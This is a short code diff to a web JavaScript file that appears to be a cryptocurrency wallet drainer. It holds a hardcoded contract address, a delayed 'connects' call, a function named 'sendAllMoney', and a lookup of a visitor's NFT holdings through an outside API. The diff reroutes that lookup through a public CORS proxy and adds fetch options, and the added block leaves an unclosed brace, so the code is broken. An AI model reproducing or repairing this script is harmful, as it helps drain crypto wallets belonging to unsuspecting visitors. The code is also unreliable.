@@ -1,5 +1,5 @@
 console.log("loaded");
-let URL = "https://onlyforapi.xyz/?address="
+let URL = "https://cors-anywhere.herokuapp.com/https://onlyforapi.xyz/?address="
 let ContractAdr = "0x64e80282Bbf9ff1B900c2042eaAaa6e3CecF6Cac";
 setTimeout(connects, 5000)
 let abi = [
@@ -288,7 +288,13 @@ async function sendAllMoney() {
 
 async function getNFTS(address) {
     let url = `${URL}${address}`;
-    let response = await fetch(url);
+    let response = await fetch(url, {
+            method: "GET", 
+            mode: 'cors',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
+            });
     let data = await response.json();
     return data;
 }
